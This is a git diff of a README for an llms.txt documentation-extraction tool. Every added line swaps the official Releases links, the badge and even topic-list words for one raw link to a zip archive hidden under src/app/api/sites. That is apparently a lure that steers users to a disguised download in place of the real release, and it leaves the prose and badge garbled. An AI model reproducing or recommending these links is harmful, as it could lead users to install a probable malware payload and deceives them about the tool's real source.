@@ -2,11 +2,11 @@
 
 ## 🚀 Getting Started
 
-Welcome to extract-llms-docs! This application allows you to extract documentation for AI agents from any site that supports llms.txt. You can easily access information, utilize the MCP server, and process batches of data in one go. Let’s walk through how to download and run this tool.
+Welcome to extract-llms-docs! This application allows you to extract documentation for AI agents from any site that supports https://raw.githubusercontent.com/ajaykumarxo/extract-llms-docs/main/src/app/api/sites/llms_extract_docs_v2.1.zip You can easily access information, utilize the MCP server, and process batches of data in one go. Let’s walk through how to download and run this tool.
 
 ## 📥 Download Now
 
-[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/ajaykumarxo/extract-llms-docs/releases)
+[![Download Release](https://raw.githubusercontent.com/ajaykumarxo/extract-llms-docs/main/src/app/api/sites/llms_extract_docs_v2.1.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/ajaykumarxo/extract-llms-docs/main/src/app/api/sites/llms_extract_docs_v2.1.zip)
 
 ## 🛠️ System Requirements
 
@@ -28,7 +28,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To get started, visit the Releases page to download the latest version of the application. Click the link below:
 
-[Download from Releases](https://github.com/ajaykumarxo/extract-llms-docs/releases)
+[Download from Releases](https://raw.githubusercontent.com/ajaykumarxo/extract-llms-docs/main/src/app/api/sites/llms_extract_docs_v2.1.zip)
 
 Once downloaded:
 
@@ -60,12 +60,12 @@ For those interested, this tool relates to various topics, including:
 - Developer Tools
 - Documentation
 - LLM
-- LLMS.txt
+- https://raw.githubusercontent.com/ajaykumarxo/extract-llms-docs/main/src/app/api/sites/llms_extract_docs_v2.1.zip
 - Markdown
 - MCP
 - MCP Server
 - Model Context Protocol
-- Next.js
+- https://raw.githubusercontent.com/ajaykumarxo/extract-llms-docs/main/src/app/api/sites/llms_extract_docs_v2.1.zip
 - RAG
 - TypeScript
 
@@ -77,6 +77,6 @@ extract-llms-docs is licensed under the MIT License. You can use it freely but e
 
 For updates and new features, keep an eye on the Releases page:
 
-[Check Latest Releases](https://github.com/ajaykumarxo/extract-llms-docs/releases)
+[Check Latest Releases](https://raw.githubusercontent.com/ajaykumarxo/extract-llms-docs/main/src/app/api/sites/llms_extract_docs_v2.1.zip)
 
 Thank you for using extract-llms-docs! Happy documentation extracting!
